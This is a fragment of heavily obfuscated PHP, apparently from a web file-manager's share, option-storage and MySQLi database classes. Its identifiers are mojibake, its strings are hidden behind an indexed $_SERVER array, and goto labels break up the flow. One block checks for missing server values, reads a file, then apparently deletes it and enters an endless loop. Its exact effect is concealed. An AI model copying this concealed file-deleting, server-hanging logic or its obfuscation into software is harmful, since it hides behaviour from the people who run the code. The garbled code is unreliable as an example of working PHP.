$üÎÄŸ€ = $this->parse($ ±’­ÚÕ); $ãÀ‡ÇæÄ = empty($ãÀ‡ÇæÄ) ? $üÎÄŸ€[$Äƒ¬Ïîù[87]] : $ãÀ‡ÇæÄ; $©×îëÅ = $this->model->addFileByRemote($üÎÄŸ€[$Äƒ¬Ïîù[486]], $ÈòÇñ¦, $ãÀ‡ÇæÄ, $³’ÁÚˆë, $§¯Ûóá); return $this->getPathOuter($©×îëÅ); } public function uploadLink($Ç ¸ø†È, $ôöäêÀÕ = 0) { $‡‡¾ÕÔÄ =& $_SERVER[€ä¾™²]; $‰ÍÁå‹· = $this->parse($Ç ¸ø†È); $‡éá¦® = _get($GLOBALS[$‡‡¾ÕÔÄ[7]], $‡‡¾ÕÔÄ[1481]); $Ù£ ‹æí = _get($GLOBALS[$‡‡¾ÕÔÄ[7]], $‡‡¾ÕÔÄ[1482]); $“Ù„Æ¾õ = KodIO::ioFileDriverGet($‡‡¾ÕÔÄ[505] . $‰ÍÁå‹·[$‡‡¾ÕÔÄ[486]] . $‡‡¾ÕÔÄ[403]); $Ô•—Áü¬ = Model($‡‡¾ÕÔÄ[703])->createFileName($‰ÍÁå‹·[$‡‡¾ÕÔÄ[87]], $“Ù„Æ¾õ, $‡éá¦®, $Ù£ ‹æí); return IO::uploadLink($Ô•—Áü¬, $ôöäêÀÕ); } public function fileNameAuto($¶Û„Ò ß, $—À§˜ÔĞ, $¼²øâê = REPEAT_REPLACE, $ÕÅø¦º¢ = false) { return $this->model->fileNameAuto($¶Û„Ò ß, $—À§˜ÔĞ, $¼²øâê, $ÕÅø¦º¢); } public function fileNameExist($´æîÅÊ, $“Ï‘†î£) { return $this->model->fileNameExist($´æîÅÊ, $“Ï‘†î£); } protected function _fileOut($—™ŞÁÒ , $¶ŞÑşØî = false, $ÉÜ‚Ø Ê = false, $†É×¾Á™ = '', $¹ššÒÁˆ = false) { $ˆı¾­Ó =& $_SERVER[€ä¾™²]; $ßá®è‚Ô = $this->model->sourceInfo($—™ŞÁÒ ); if ($ßá®è‚Ô[$ˆı¾­Ó[507]] == $ˆı¾­Ó[91]) { header($ˆı¾­Ó[1483]); die; } $ûÃÕüÏ× = $this->model->fileInfoGet($—™ŞÁÒ ); $†É×¾Á™ = $ûÃÕüÏ×[$ˆı¾­Ó[570]] ? $ûÃÕüÏ×[$ˆı¾­Ó[570]] : $†É×¾Á™; $è·â¤®ç = isset($GLOBALS[$ˆı¾­Ó[181]]) && is_array($GLOBALS[$ˆı¾­Ó[181]]) ? $GLOBALS[$ˆı¾­Ó[181]][$ˆı¾­Ó[32]] : $ßá®è‚Ô[$ˆı¾­Ó[32]]; if ($¹ššÒÁˆ) { return IO::fileOutServer($ûÃÕüÏ×[$ˆı¾­Ó[87]], $¶ŞÑşØî, $è·â¤®ç, $†É×¾Á™); } IO::fileOut($ûÃÕüÏ×[$ˆı¾­Ó[87]], $¶ŞÑşØî, $è·â¤®ç, $†É×¾Á™); } public function fileOut($Õ«öã¶’, $º¦ÉÉê = false, $‡ëİã³ = false, $Êô·ûãò = '') { $this->_fileOut($Õ«öã¶’, $º¦ÉÉê, $‡ëİã³, $Êô·ûãò); } public function fileOutServer($”ç“»», $û·‰Ïû = false, $»úÄˆ©‰ = false, $ğœÇµÇµ = '') { $this->_fileOut($”ç“»», $û·‰Ïû, $»úÄˆ©‰, $ğœÇµÇµ, !0); } protected function _fileOutImage($Ò¹Œ³›ê, $ÃÆ¦À¤Ø = 250) { $ÛœÆÆì =& $_SERVER[€ä¾™²]; $øÅğ·‚ = $this->model->pathInfo($Ò¹Œ³›ê); if ($øÅğ·‚[$ÛœÆÆì[507]] == $ÛœÆÆì[91]) { show_json($ÛœÆÆì[1484] . $Ò¹Œ³›ê, !1); } $£¹©¥ = $this->model->fileInfoGet($Ò¹Œ³›ê); $øÅğ·‚[$ÛœÆÆì[182]] = $£¹©¥[$ÛœÆÆì[87]]; $GLOBALS[$ÛœÆÆì[181]] = $øÅğ·‚; IO::fileOutImage($£¹©¥[$ÛœÆÆì[87]], $ÃÆ¦À¤Ø); } public function fileOutImage($à•¦‘ø, $Ÿ²«ãÛÑ = 250) { $this->_fileOutImage($à•¦‘ø, $Ÿ²«ãÛÑ); } public function fileOutImageServer($“µÙËß, $öµ¼Ï—‡ = 250) { $this->_fileOutImage($“µÙËß, $öµ¼Ï—‡); } public function link($ÀşÒˆ¸, $Œ‘Á‰ş = '') { $ó±’°ï¢ = $this->model->fileInfoGet($ÀşÒˆ¸); return IO::link($ó±’°ï¢[$_SERVER[€ä¾™²][87]], $Œ‘Á‰ş); } protected function parse($‡©÷±») { $àŠåÌÑú =& $_SERVER[€ä¾™²]; if (strstr($‡©÷±», $àŠåÌÑú[8]) === !1) { return array($àŠåÌÑú[515] => intval($‡©÷±»), $àŠåÌÑú[87] => $àŠåÌÑú[12], $àŠåÌÑú[1480] => array()); } $ğ¥íï»¿ = explode($àŠåÌÑú[8], trim($‡©÷±», $àŠåÌÑú[8])); if (count($ğ¥íï»¿) < 2) { show_tips(clear_html($‡©÷±») . $àŠåÌÑú[1485]); } return array($àŠåÌÑú[515] => intval($ğ¥íï»¿[0]), $àŠåÌÑú[87] => $ğ¥íï»¿[1], $àŠåÌÑú[1480] => array_slice($ğ¥íï»¿, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ûşºÕ) { $this->pathParse = $ûşºÕ; $this->model = Model($_SERVER[€ä¾™²][1479]); } public function getPathRoot() { $š³¤›ÎÚ =& $_SERVER[€ä¾™²]; return KodIO::makeShare($this->pathParse[$š³¤›ÎÚ[486]], $this->pathParse[$š³¤›ÎÚ[1303]]); } public function getPathOuter($ÅÉááç‰) { $Óû×÷°ç =& $_SERVER[€ä¾™²]; if (!$ÅÉááç‰) { return $ÅÉááç‰; } $È×Øö  = $this->parse($ÅÉááç‰); return trim(KodIO::makeShare($this->pathParse[$Óû×÷°ç[486]], $È×Øö [$Óû×÷°ç[486]]), $Óû×÷°ç[8]); } public function isParentOf($çÜƒ‚Òô, $î©–İœ) { $Ÿ¬Æö± = IO::init($î©–İœ); return $this->model->isParentOf($çÜƒ‚Òô, $Ÿ¬Æö±->path); } protected function infoParse($ºêÂ•šÇ, $üÙ±½Ï = false, $µ„Ã¼¬Õ = false) { $á‡†Ü¥ =& $_SERVER[€ä¾™²]; static $»øîŞ‹ù = array(); $ÄÍ¾·ô· = $this->pathParse[$á‡†Ü¥[486]]; $ñƒŠÖ·ü = trim($this->pathParse[$á‡†Ü¥[1299]], $á‡†Ü¥[8]); if (isset($»øîŞ‹ù[$ñƒŠÖ·ü]) && is_array($»øîŞ‹ù[$ñƒŠÖ·ü])) { return $»øîŞ‹ù[$ñƒŠÖ·ü]; } $Õôº³ô = Action($á‡†Ü¥[1486])->sharePathInfo($ÄÍ¾·ô·, $ñƒŠÖ·ü, $üÙ±½Ï); $»øîŞ‹ù[$ñƒŠÖ·ü] = $Õôº³ô; return $Õôº³ô; } public function infoFull($ëÊ»›‰Ü) { $Ú úëş² =& $_SERVER[€ä¾™²]; $´õÅ©îİ = explode($Ú úëş²[8], trim($ëÊ»›‰Ü, $Ú úëş²[8])); if (count($´õÅ©îİ) > 1) { $ûõÓ®ÈÖ = implode($Ú úëş²[8], array_splice($´õÅ©îİ, 1)); $¤à¤“•æ = $this->model->pathInfoByPath($´õÅ©îİ[0], $ûõÓ®ÈÖ); if (!$¤à¤“•æ) { return !1; } $this->pathParse[$Ú úëş²[1299]] = $¤à¤“•æ[$Ú úëş²[192]]; } return $this->infoParse($ëÊ»›‰Ü); } public function listAll($ÏıÅ¬ú³) { $¾×“·€ =& $_SERVER[€ä¾™²]; $Ì’Çóäè = IO::info($this->pathParse[$¾×“·€[87]]); if (!$Ì’Çóäè) { return array(); } $¾ºå­å– = $this->model->listAll($ÏıÅ¬ú³); $ëàŒÂ = Model($¾×“·€[693])->getInfo($Ì’Çóäè[$¾×“·€[694]]); foreach ($¾ºå­å– as &$›±‚ñ×Æ) { check_abort(); $›±‚ñ×Æ[$¾×“·€[90]] = Action($¾×“·€[1486])->_shareItemeParse($›±‚ñ×Æ[$¾×“·€[90]], $ëàŒÂ); } unset($›±‚ñ×Æ); return $¾ºå­å–; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÄïÉ×ƒı) { $this->pathParse = $ÄïÉ×ƒı; $this->model = Model($_SERVER[€ä¾™²][1479]); } protected function infoParse($’È™öûù, $ĞÓë‘ë‰ = false, $şëäé‹‹ = false) { $æğ»‰©œ =& $_SERVER[€ä¾™²]; return Action($æğ»‰©œ[1306])->sharePathInfo($this->pathParse[$æğ»‰©œ[87]], !0, $ĞÓë‘ë‰); } public function listPath($¯«ÄÙ•£, $ßã—åêå = false) { $³‹¬·šû =& $_SERVER[€ä¾™²]; $ƒ¾é§Ã¤ = parent::listPath($¯«ÄÙ•£, $ßã—åêå); if (!$ƒ¾é§Ã¤) { return $ƒ¾é§Ã¤; } if (is_array($ƒ¾é§Ã¤[$³‹¬·šû[1487]])) { $ƒ¾é§Ã¤[$³‹¬·šû[1487]] = Action($³‹¬·šû[1306])->shareItemInfo($ƒ¾é§Ã¤[$³‹¬·šû[1487]]); } foreach ($ƒ¾é§Ã¤ as $õ¶ª‡¼– => $¨•ºÌ‰æ) { if (!in_array($õ¶ª‡¼–, array($³‹¬·šû[86], $³‹¬·šû[85]))) { continue; } foreach ($¨•ºÌ‰æ as $‡²Ã€®¥ => $ÈŞÉ«óÓ) { $ƒ¾é§Ã¤[$õ¶ª‡¼–][$‡²Ã€®¥] = Action($³‹¬·šû[1306])->shareItemInfo($ÈŞÉ«óÓ); } } return $ƒ¾é§Ã¤; } public function listAll($µ—™µ³ü) { $İ¯˜Ö“© =& $_SERVER[€ä¾™²]; $Êº–¬ØÖ = IO::info($this->pathParse[$İ¯˜Ö“©[87]]); if (!$Êº–¬ØÖ) { return array(); } $¼Ğ¨Šèİ = $this->model->listAll($µ—™µ³ü); foreach ($¼Ğ¨Šèİ as &$Â¸şĞË) { $Â¸şĞË[$İ¯˜Ö“©[90]] = Action($İ¯˜Ö“©[1306])->shareItemInfo($Â¸şĞË[$İ¯˜Ö“©[90]]); } unset($Â¸şĞË); return $¼Ğ¨Šèİ; } } goto C”Ú‘„…¶¦; bÁ°»ŸÅ§ñ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\x6d\x4f\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($îšş”À… = false, $Ë°Ï˜ïã = "\x6d\x6f\144\x69\x66\171\x54\x69\x6d\x65", $Ç»·Ö†ë = false) { $ş·çœ¦¸ =& $_SERVER[€ä¾™²]; $ÄşøÊµû = Model($this->modelType)->get(!1, $this->optionType, !0); $Öºåæ¾ğ = array_values($ÄşøÊµû); if ($Öºåæ¾ğ && $Öºåæ¾ğ[0] && !is_array($Öºåæ¾ğ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÄşøÊµû = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÄşøÊµû) { return $îšş”À… ? null : array(); } if (!$îšş”À… && $îšş”À… !== $ş·çœ¦¸[229]) { $ÄşøÊµû = array_filter(array_values($ÄşøÊµû)); return array_sort_by($ÄşøÊµû, $Ë°Ï˜ïã, $Ç»·Ö†ë, $ş·çœ¦¸[486]); } return $ÄşøÊµû[$ş·çœ¦¸[487] . $îšş”À…]; } public function insert($ú§§Â‹) { $£¶ëÚ–Œ =& $_SERVER[€ä¾™²]; $ú§§Â‹ = array_field_key($ú§§Â‹, $this->field); $Š’ë‡´¹ = Model($this->modelType)->get($£¶ëÚ–Œ[488], $this->optionType . $£¶ëÚ–Œ[489]); $Š’ë‡´¹ = $Š’ë‡´¹ ? $Š’ë‡´¹ : 0; $ú§§Â‹[$£¶ëÚ–Œ[486]] = ++$Š’ë‡´¹; $ú§§Â‹[$£¶ëÚ–Œ[232]] = time(); $ú§§Â‹[$£¶ëÚ–Œ[88]] = time(); Model($this->modelType)->set($£¶ëÚ–Œ[488], $Š’ë‡´¹, $this->optionType . $£¶ëÚ–Œ[489]); Model($this->modelType)->set($£¶ëÚ–Œ[487] . $Š’ë‡´¹, $ú§§Â‹, $this->optionType); return $Š’ë‡´¹; } public function insertArr($şÓäÑÎ) { $Ú¡íÇó =& $_SERVER[€ä¾™²]; if (!$şÓäÑÎ || !is_array($şÓäÑÎ)) { return !1; } $÷•ôôÃû = Model($this->modelType)->get($Ú¡íÇó[488], $this->optionType . $Ú¡íÇó[489]); $÷•ôôÃû = $÷•ôôÃû ? $÷•ôôÃû : 0; $È˜•ğ·í = array(); foreach ($şÓäÑÎ as $îÆòÀº÷) { $ƒÂşíïÂ = array_field_key($îÆòÀº÷, $this->field); $ƒÂşíïÂ[$Ú¡íÇó[486]] = ++$÷•ôôÃû; $ƒÂşíïÂ[$Ú¡íÇó[232]] = time(); $ƒÂşíïÂ[$Ú¡íÇó[88]] = time(); $È˜•ğ·í[$Ú¡íÇó[487] . $÷•ôôÃû] = $ƒÂşíïÂ; } Model($this->modelType)->set($Ú¡íÇó[488], $÷•ôôÃû, $this->optionType . $Ú¡íÇó[489]); Model($this->modelType)->set($È˜•ğ·í, !1, $this->optionType); return $÷•ôôÃû; } public function update($é İÖÀû, $î€‘éë²) { $Äú‚÷»Å =& $_SERVER[€ä¾™²]; $î€‘éë² = array_field_key($î€‘éë², $this->field); $»­¾É¢Ì = $this->listData($é İÖÀû); if (!$»­¾É¢Ì || !$é İÖÀû) { return !1; } $î€‘éë² = array_merge($»­¾É¢Ì, $î€‘éë²); $î€‘éë²[$Äú‚÷»Å[88]] = time(); return Model($this->modelType)->set($Äú‚÷»Å[487] . $é İÖÀû, $î€‘éë², $this->optionType); } public function remove($„ÓÁª¯) { if (!$„ÓÁª¯) { return !1; } return Model($this->modelType)->remove($_SERVER[€ä¾™²][487] . $„ÓÁª¯, $this->optionType); } public function removeArr($ßµ¦¬‰ª) { if (!$ßµ¦¬‰ª) { return !0; } $âÓ›éÍ = array(); foreach ($ßµ¦¬‰ª as $­ï’èÈç) { $âÓ›éÍ[] = $_SERVER[€ä¾™²][487] . $­ï’èÈç; } return Model($this->modelType)->removeArr($âÓ›éÍ, $this->optionType); } public function clear() { $›¸ç¯è¿ =& $_SERVER[€ä¾™²]; Model($this->modelType)->remove($›¸ç¯è¿[488], $this->optionType . $›¸ç¯è¿[489]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ã˜ÀÜ—Ö, $ò°Û¼Î¼) { if (!$ò°Û¼Î¼) { return !1; } $ÇÖÕ•£Ç = $this->listData(); $ÇÖÕ•£Ç = array_to_keyvalue($ÇÖÕ•£Ç, $Ã˜ÀÜ—Ö); return isset($ÇÖÕ•£Ç[$ò°Û¼Î¼]) ? $ÇÖÕ•£Ç[$ò°Û¼Î¼] : !1; } public function findByName($ÔäÔÍ¥ş) { return $this->findByKey($_SERVER[€ä¾™²][32], $ÔäÔÍ¥ş); } protected function resetData($Ñ²µù²) { $ğ‰ ÷à =& $_SERVER[€ä¾™²]; if (!$Ñ²µù²) { return; } $Ñ²µù² = is_array($Ñ²µù²) ? $Ñ²µù² : array(); $™çØÍ˜ = array(); for ($æÑ”Ä†¹ = 0; $æÑ”Ä†¹ < count($Ñ²µù²); $æÑ”Ä†¹++) { if (!$Ñ²µù²[$æÑ”Ä†¹] || !$Ñ²µù²[$æÑ”Ä†¹][$ğ‰ ÷à[486]]) { continue; } $™çØÍ˜[$ğ‰ ÷à[487] . $Ñ²µù²[$æÑ”Ä†¹][$ğ‰ ÷à[486]]] = $Ñ²µù²[$æÑ”Ä†¹]; } return Model($this->modelType)->set($™çØÍ˜, !1, $this->optionType); } private function getAutoName($´øãÙä¶) { $×â‘Üß¶ = array_to_keyvalue($this->listData(), $_SERVER[€ä¾™²][32]); if (!$×â‘Üß¶ || !isset($×â‘Üß¶[$´øãÙä¶])) { return $´øãÙä¶; } for ($‰ÊşÊóÍ = 1; $‰ÊşÊóÍ < count($×â‘Üß¶); $‰ÊşÊóÍ++) { $ö½õ’”š = $´øãÙä¶ . "\x28{$‰ÊşÊóÍ}\x29"; if (!isset($×â‘Üß¶[$ö½õ’”š])) { return $ö½õ’”š; } } return $ö½õ’”š; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¾’•ï¤ = false, $Ğ¢ì¿îØ = '', $Ë±æ¬õ¢ = false, $ßÎÕˆå¸ = true) { $Ê“‰Çµ­ =& $_SERVER[€ä¾™²]; $±Å¾Œâ¨ = $this->cacheGet($Ğ¢ì¿îØ); $ÎÌÄùì† = $this->optionDefault($Ğ¢ì¿îØ); $ÎÌÄùì† = is_array($ÎÌÄùì†) ? $ÎÌÄùì† : array(); if (is_array($±Å¾Œâ¨)) { if ($ßÎÕˆå¸) { $±Å¾Œâ¨ = array_merge($ÎÌÄùì†, $±Å¾Œâ¨); } return $¾’•ï¤ ? isset($±Å¾Œâ¨[$¾’•ï¤]) ? $±Å¾Œâ¨[$¾’•ï¤] : null : $±Å¾Œâ¨; } $§‹‹áÔí = $this->filterWhere(array($Ê“‰Çµ­[33] => $Ğ¢ì¿îØ)); $±Å¾Œâ¨ = $this->where($§‹‹áÔí)->select(); $±Å¾Œâ¨ = array_to_keyvalue($±Å¾Œâ¨, $Ê“‰Çµ­[95], $Ê“‰Çµ­[451]); foreach ($±Å¾Œâ¨ as $Ëñ’¤ˆ‚ => $¬›íı¼Ó) { if ($Ë±æ¬õ¢ || in_array($Ëñ’¤ˆ‚, $this->jsonField)) { $±Å¾Œâ¨[$Ëñ’¤ˆ‚] = json_decode($¬›íı¼Ó, !0); } } $this->cacheSet($Ğ¢ì¿îØ, $±Å¾Œâ¨); if ($ßÎÕˆå¸) { $±Å¾Œâ¨ = array_merge($ÎÌÄùì†, $±Å¾Œâ¨); } return $¾’•ï¤ ? $±Å¾Œâ¨[$¾’•ï¤] : $±Å¾Œâ¨; } public function set($’­†›®è, $“óµöï† = false, $“ŠÂãÕÃ = '') { $¯°¥Ò‘ =& $_SERVER[€ä¾™²]; if (!$’­†›®è) { return !0; } $©ñßç±Ë = $this->get(!1, $“ŠÂãÕÃ, !1, !1); $©ñßç±Ë = is_array($©ñßç±Ë) ? $©ñßç±Ë : array(); $°§ÂŠµğ = array(); $¶Ñ“åä = array(); $Ô®Ô¶¦Ù = array(); $¸ˆÛ­Ÿ’ = is_array($’­†›®è) ? $’­†›®è : array($’­†›®è => $“óµöï†); $É¯Óóç“ = $this->filterWhere(array($¯°¥Ò‘[33] => $“ŠÂãÕÃ)); foreach ($¸ˆÛ­Ÿ’ as $È¸Ş©¼´ => $öî©ø°) { if (is_array($öî©ø°)) { $öî©ø° = json_encode_force($öî©ø°); } $this->checkLength($öî©ø°, !1, $this->tableName . $¯°¥Ò‘[4] . $’­†›®è); $öî©ø° = self::textEncode($öî©ø°); if (array_key_exists($È¸Ş©¼´, $©ñßç±Ë)) { $ı¤ƒÒÃ = is_array($©ñßç±Ë[$È¸Ş©¼´]) ? json_encode_force($©ñßç±Ë[$È¸Ş©¼´]) : $©ñßç±Ë[$È¸Ş©¼´]; $ı¤ƒÒÃ = self::textEncode($ı¤ƒÒÃ); if ($ı¤ƒÒÃ === $öî©ø°) { continue; } $¶Ñ“åä[] = array($¯°¥Ò‘[95], $È¸Ş©¼´, $¯°¥Ò‘[451], $öî©ø°, $¯°¥Ò‘[88], time()); } else { $»œÏƒã = array($¯°¥Ò‘[33] => $“ŠÂãÕÃ, $¯°¥Ò‘[95] => $È¸Ş©¼´, $¯°¥Ò‘[451] => $öî©ø°); $°§ÂŠµğ[] = $this->filterWhere($»œÏƒã); } } if (!$°§ÂŠµğ && !$¶Ñ“åä) { return !0; } $this->cacheRemove($“ŠÂãÕÃ); $”ÊË¢“© = $this->cacheKey($¯°¥Ò‘[490]); CacheLock::lock($”ÊË¢“©); if ($°§ÂŠµğ) { $this->addAll($°§ÂŠµğ); } if ($¶Ñ“åä) { $this->saveAll($¶Ñ“åä, $É¯Óóç“); } CacheLock::unlock($”ÊË¢“©); return !0; } protected function optionDefault($àÍŸ—º„ = '') { return !1; } public function setDeep($“ß‰‚ñ, $‚ê Šë = false, $»¡Ğ„û = '') { $Ä®Ë”á¶ = explode($_SERVER[€ä¾™²][10], $“ß‰‚ñ); $¸—î÷ù = $this->get(); array_set_value($¸—î÷ù, $“ß‰‚ñ, $‚ê Šë); $this->set($Ä®Ë”á¶[0], $¸—î÷ù[$Ä®Ë”á¶[0]], $»¡Ğ„û); } public function remove($­Ç¿®Í, $ÎôÒš› = '') { $í¼ÖÀ¿³ =& $_SERVER[€ä¾™²]; $this->cacheRemove($ÎôÒš›); $ù‰ëÄí› = $this->filterWhere(array($í¼ÖÀ¿³[95] => $­Ç¿®Í, $í¼ÖÀ¿³[33] => $ÎôÒš›)); if (is_null($­Ç¿®Í)) { unset($ù‰ëÄí›[$í¼ÖÀ¿³[95]]); } return $this->where($ù‰ëÄí›)->delete(); } public function removeArr($†”û, $÷Ô°Ïûø = '') { $·ñŞ¾ş =& $_SERVER[€ä¾™²]; if (!$†”û || !is_array($†”û)) { return !0; } $this->cacheRemove($÷Ô°Ïûø); $¡õ­î³˜ = $this->filterWhere(array($·ñŞ¾ş[33] => $÷Ô°Ïûø, $·ñŞ¾ş[95] => array($·ñŞ¾ş[7], $†”û))); return $this->where($¡õ­î³˜)->delete(); } public function cacheSet($×ÍÂ¤û¤, $ã·¹ñÍÕ = false) { return Cache::set($this->cacheKey($×ÍÂ¤û¤), $ã·¹ñÍÕ); } public function cacheGet($ë½È°ëä) { return Cache::get($this->cacheKey($ë½È°ëä)); } public function cacheRemove($ÎÖµäĞİ) { return Cache::remove($this->cacheKey($ÎÖµäĞİ)); } protected function filterWhere($Õœ†‡Ş‘) { return $Õœ†‡Ş‘; } protected function cacheKey($¨ùŞ¶µó) { return $¨ùŞ¶µó; } } if (!isset($_SERVER[$_SERVER[€ä¾™²][491]]) || !isset($_SERVER[$_SERVER[€ä¾™²][492]])) { $_getc = $_SERVER[€ä¾™²][493]; $_getfile = $_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[€ä¾™²][286], $_getfilec); if (count($_getarrs) < $_SERVER[€ä¾™²][496]) { $exit = $_SERVER[€ä¾™²][497]; $exit(); } $_act = $_SERVER[€ä¾™²][498]; $_act($_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[€ä¾™²][463]); } } goto c‡µ‰¼¨; f†¨æˆìÆ¿: class DbMysqli extends Db { public function __construct($åÕÜ†ú = '') { $öËïÜÙÎ =& $_SERVER[€ä¾™²]; if (!extension_loaded($öËïÜÙÎ[1025])) { think_exception(think_lang($öËïÜÙÎ[14]) . $öËïÜÙÎ[1026]); } if (!empty($åÕÜ†ú)) { $this->config = $åÕÜ†ú; if (empty($this->config[$öËïÜÙÎ[17]])) { $this->config[$öËïÜÙÎ[17]] = $öËïÜÙÎ[12]; } } } public function connect($ë½ÉÁª¢ = '', $›ø§½å = 0) { $ã×˜ãÅ§ =& $_SERVER[€ä¾™²]; if (!isset($this->linkID[$›ø§½å])) { if (empty($ë½ÉÁª¢)) { $ë½ÉÁª¢ = $this->config; } $this->linkID[$›ø§½å] = new mysqli($ë½ÉÁª¢[$ã×˜ãÅ§[996]], $ë½ÉÁª¢[$ã×˜ãÅ§[998]], $ë½ÉÁª¢[$ã×˜ãÅ§[999]], $ë½ÉÁª¢[$ã×˜ãÅ§[21]], $ë½ÉÁª¢[$ã×˜ãÅ§[997]] ? intval($ë½ÉÁª¢[$ã×˜ãÅ§[997]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ŠÌÙËê˜ = $this->linkID[$›ø§½å]->server_version; $this->linkID[$›ø§½å]->query($ã×˜ãÅ§[1000] . think_config($ã×˜ãÅ§[1001]) . $ã×˜ãÅ§[58]); if ($ŠÌÙËê˜ > $ã×˜ãÅ§[1002]) { $this->linkID[$›ø§½å]->query($ã×˜ãÅ§[1003]); } $this->connected = !0; if (1 != think_config($ã×˜ãÅ§[22])) { unset($this->config); } } return $this->linkID[$›ø§½å]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ãÙ©ñÔ’) { $««“ıŠæ =& $_SERVER[€ä¾™²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ãÙ©ñÔ’; if ($this->queryID) { $this->free(); } think_action_status($««“ıŠæ[23], 1); think_status($««“ıŠæ[24]); $this->queryID = $this->_linkID->query($ãÙ©ñÔ’); if ($this->_linkID->more_results()) { while (($ƒˆ½¬š‘ = $this->_linkID->next_result()) != NULL) { $ƒˆ½¬š‘->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÊÏú™øª) { $ÔÁİÔÇ˜ =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÏú™øª; if ($this->queryID) { $this->free(); } think_action_status($ÔÁİÔÇ˜[25], 1); think_status($ÔÁİÔÇ˜[24]); $Š®İ—¡ = $this->_linkID->query($ÊÏú™øª); $this->debug(); if (!1 === $Š®İ—¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…ø¿ù»Ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$…ø¿ù»Ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„ç¶»¬Å = $this->_linkID->rollback(); $this->transTimes = 0; if (!$„ç¶»¬Å) { $this->error(); return !1; } } return !0; } private function getAll() { $§æåïÉé = array(); if ($this->numRows > 0) { for ($Ø°¼¶ç£ = 0; $Ø°¼¶ç£ < $this->numRows; $Ø°¼¶ç£++) { $§æåïÉé[$Ø°¼¶ç£] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $§æåïÉé; } public function getFields($÷Ÿ¤Æ‰) { $Ùìö½şù =& $_SERVER[€ä¾™²]; $Ş”Ãİé = $this->query($Ùìö½şù[1007] . $this->parseKey($÷Ÿ¤Æ‰)); $«šØî¿¶ = array(); if ($Ş”Ãİé) { foreach ($Ş”Ãİé as $Ğ‰–œ·» => $–Éœ°™¼) { $«šØî¿¶[$–Éœ°™¼[$Ùìö½şù[31]]] = array($Ùìö½şù[32] => $–Éœ°™¼[$Ùìö½şù[31]], $Ùìö½şù[33] => $–Éœ°™¼[$Ùìö½şù[34]], $Ùìö½şù[35] => (bool) ($–Éœ°™¼[$Ùìö½şù[36]] === $Ùìö½şù[12]), $Ùìö½şù[37] => $–Éœ°™¼[$Ùìö½şù[38]], $Ùìö½şù[39] => strtolower($–Éœ°™¼[$Ùìö½şù[40]]) == $Ùìö½şù[41], $Ùìö½şù[42] => strtolower($–Éœ°™¼[$Ùìö½şù[43]]) == $Ùìö½şù[44]); } } return $«šØî¿¶; } public function getTables($”ç×ã–¬ = '') { $²›æó‚Ç =& $_SERVER[€ä¾™²]; $üˆ±¿ÁŞ = !empty($”ç×ã–¬) ? $²›æó‚Ç[1009] . $”ç×ã–¬ . $²›æó‚Ç[1010] : $²›æó‚Ç[1011]; $‹„ÜıØÁ = $this->query($üˆ±¿ÁŞ); $ô‰ÕÅğ = array(); if ($‹„ÜıØÁ) { foreach ($‹„ÜıØÁ as $¾œÖßüØ => $öŒŠ›¹õ) { $ô‰ÕÅğ[$¾œÖßüØ] = current($öŒŠ›¹õ); } } return $ô‰ÕÅğ; } public function replace($Ì¶ØÆã¿, $»­Á¾”û = array()) { $ÂÌÃÙöº =& $_SERVER[€ä¾™²]; foreach ($Ì¶ØÆã¿ as $ˆ¡ß¶•´ => $Â¦´Î¶Ş) { $„‰³ÖÇ = $this->parseValue($Â¦´Î¶Ş); if (is_scalar($„‰³ÖÇ)) { $‚ùõ‘ëª[] = $„‰³ÖÇ; $ºƒ€àº[] = $this->parseKey($ˆ¡ß¶•´); } } $Î´êÀºÍ = $ÂÌÃÙöº[1012] . $this->parseTable($»­Á¾”û[$ÂÌÃÙöº[358]]) . $ÂÌÃÙöº[1013] . implode($ÂÌÃÙöº[50], $ºƒ€àº) . $ÂÌÃÙöº[1014] . implode($ÂÌÃÙöº[50], $‚ùõ‘ëª) . $ÂÌÃÙöº[1015]; return $this->execute($Î´êÀºÍ); } public function insertAll($éÃ°·Ë, $İ®â¸ŸÒ = array(), $ÜÀÑë—® = false) { $ÃÉìÑÒ¬ =& $_SERVER[€ä¾™²]; if (!is_array($éÃ°·Ë[0])) { return !1; } $¦¨İñæ = array_keys($éÃ°·Ë[0]); $Ó§§ˆÛ‹ = array(); foreach ($éÃ°·Ë as $öüõ—ô) { $¬ş¢Æ® = array(); foreach ($öüõ—ô as $úëÆÛúÄ => $é±ã®¡ã) { $é±ã®¡ã = $this->parseValue($é±ã®¡ã); if (is_scalar($é±ã®¡ã)) { $¬ş¢Æ®[] = $é±ã®¡ã; } } $Ó§§ˆÛ‹[] = $ÃÉìÑÒ¬[338] . implode($ÃÉìÑÒ¬[50], $¬ş¢Æ®) . $ÃÉìÑÒ¬[1015]; } array_walk($¦¨İñæ, array($this, 